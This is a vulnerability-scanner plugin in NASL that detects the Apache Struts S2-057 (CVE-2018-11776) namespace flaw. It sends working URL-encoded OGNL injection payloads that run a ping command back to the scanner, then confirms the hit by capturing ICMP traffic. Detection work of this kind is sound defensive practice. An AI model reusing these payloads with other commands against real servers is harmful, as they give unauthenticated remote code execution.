include("compat.inc");

if (description)
{
  script_id(112064);
  script_version("1.2");
  script_cvs_date("Date: 2018/08/24 20:37:41");

  script_cve_id("CVE-2018-11776");
  script_bugtraq_id(105125);
  script_xref(name:"IAVA", value:"2018-A-0275");

  script_name(english:"Apache Struts CVE-2018-11776 Results With No Namespace Remote Code Execution (S2-057) (remote)");
  script_summary(english:"Attempts to execute arbitrary commands on the remote web server.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web application that uses a Java
framework that is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Apache Struts running on the remote host is affected by
a remote code execution vulnerability in the handling of results with
no namespace set. An unauthenticated, remote attacker can exploit this,
via a specially crafted HTTP request, to potentially execute arbitrary
code, subject to the privileges of the web server user.");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/S2-057");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2018/Aug/46");
  script_set_attribute(attribute:"see_also", value:"https://semmle.com/news/apache-struts-CVE-2018-11776");
  script_set_attribute(attribute:"see_also", value:"https://lgtm.com/blog/apache_struts_CVE-2018-11776");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Apache Struts version 2.3.35 / 2.5.17 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"remote code execution");

  script_set_attribute(attribute:"vuln_publication_date", value:"2018/08/22");
  script_set_attribute(attribute:"patch_publication_date", value:"2018/08/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/08/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"Copyright (C) 2004-2018 WebRAY");

  script_dependencies("http_version.nasl", "webmirror.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80, 8080);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("torture_cgi_func.inc");
include("url_func.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp / .do suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = pregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = pregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    # Test the Struts 2 Sample Applications that are affected
    match3 = pregmatch(pattern:"(^.*)(struts2-showcase.*)$", string:cgi);
    if (!isnull(match3))
    {
      urls = make_list(urls, match3[0]);
      if (!thorough_tests) break;
    }
    match4 = pregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match4))
    {
      urls = make_list(urls, match4[0]);
      if (!thorough_tests) break;
    }
  }
}

if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

if (empty(urls))
  audit(AUDIT_WEB_FILES_NOT, "Struts 2 .action / .do / .jsp", port);

urls = list_uniq(urls);
scanner_ip = this_host();
target_ip = get_host_ip();
vuln = FALSE;

ua = get_kb_item("global_settings/http_user_agent");
if (empty_or_null(ua))
  ua = 'GizaNE';

#filter = "icmp and icmp[0] = 8 and src host " + target_ip;
filter = "icmp and icmp[0] = 8 and dst host " + scanner_ip;
pat = hexstr(rand_str(length:10));

os = get_kb_item("Host/OS");
if (!empty_or_null(os) && "windows" >< tolower(os))
  ping_cmd = "ping%20-n%203" + scanner_ip;
else
  ping_cmd = "ping%20-c%203%20-p" + pat + "%20" + scanner_ip;

payload_redirect = "%24%7B%7B57550614+16044095%7D%7D/";
payload_redirect_verify_regex = "Location: .*\[73594709\]";

payload_2_2 = "%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27" + ping_cmd + "%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/";

payload_2_3 = "%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27" + ping_cmd + "%27%29%29%7D/";

function namespace_inject(url, payload)
{
  local_var bits, last, attack_url;

  # find the last / and put it after
  bits = split(url, sep:"/", keep:TRUE);
  last = max_index(bits) - 1;
  for (i=0;i<last;i++)
    attack_url = attack_url + bits[i];
  attack_url = attack_url + payload;
  attack_url = attack_url + bits[last];

  return attack_url;
}

foreach url (urls)
{
  # first we try the 2.3.x payload
  soc = open_sock_tcp(port);
  if (!soc) audit(AUDIT_SOCK_FAIL, port);

  attack_url = namespace_inject(url:url, payload:payload_2_3);

  req =
    'GET ' + attack_url + ' HTTP/1.1\n' +
    'Host: ' + target_ip + ':' + port + '\n' +
    'User-Agent: ' + ua + '\n' +
    '\n';

  s = send_capture(socket:soc,data:req,pcap_filter:filter);
  icmp = tolower(hexstr(get_icmp_element(icmp:s,element:"data")));
  close(soc);

  if ("windows" >< tolower(os) && !isnull(icmp))
  {
    vuln = TRUE;
    vuln_url = req;
    report =
      '\nConfirmed this issue by examining ICMP traffic. '+
      'Below is the response :' +
      '\n\n' + snip +
      '\n' + icmp +
      '\n' + snip +
      '\n';
    break;
  }
  else if (pat >< icmp)
  {
    vuln = TRUE;
    vuln_url = req;
    report =
      '\nConfirmed this issue by examining ICMP traffic and looking for'+
      '\nthe pattern sent in our packet (' + pat + '). Below is the response :'+
      '\n\n' + snip +
      '\n' + icmp +
      '\n' + snip +
      '\n';
    break;
  }

  # next we try the 2.2.x payload
  soc = open_sock_tcp(port);
  if (!soc) audit(AUDIT_SOCK_FAIL, port);

  attack_url = namespace_inject(url:url, payload:payload_2_2);

  req =
    'GET ' + attack_url + ' HTTP/1.1\n' +
    'Host: ' + target_ip + ':' + port + '\n' +
    'User-Agent: ' + ua + '\n' +
    '\n';

  s = send_capture(socket:soc,data:req,pcap_filter:filter);
  icmp = tolower(hexstr(get_icmp_element(icmp:s,element:"data")));
  close(soc);

  if ("windows" >< tolower(os) && !isnull(icmp))
  {
    vuln = TRUE;
    vuln_url = req;
    report =
      '\nConfirmed this issue by examining ICMP traffic. '+
      'Below is the response :' +
      '\n\n' + snip +
      '\n' + icmp +
      '\n' + snip +
      '\n';
    break;
  }
  else if (pat >< icmp)
  {
    vuln = TRUE;
    vuln_url = req;
    report =
      '\nConfirmed this issue by examining ICMP traffic and looking for'+
      '\nthe pattern sent in our packet (' + pat + '). Below is the response :'+
      '\n\n' + snip +
      '\n' + icmp +
      '\n' + snip +
      '\n';
    break;
  }

  # and finally, we try a simple redirect namespace injection
  attack_url = namespace_inject(url:url, payload:payload_redirect);

  res = http_send_recv3(
    method       : "GET",
    item         : attack_url,
    port         : port,
    exit_on_fail : TRUE,
    follow_redirect: 0
  );

  if (res[1] =~ payload_redirect_verify_regex)
  {
    vuln = TRUE;
    vuln_url = attack_url;
    report =
      '\nConfirmed this issue by injecting a simple OGNL addition payload'+
      '\n( ${{57550614+16044095}} ) into a redirect action namespace. Below is' +
      '\nthe response :'+
      '\n\n' + snip +
      '\n' + res[1] +
      '\n' + snip +
      '\n';
    break;
  }

  # Stop after first vulnerable Struts app is found
  if (vuln) break;
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  request    : make_list(vuln_url),
  output     : report
);
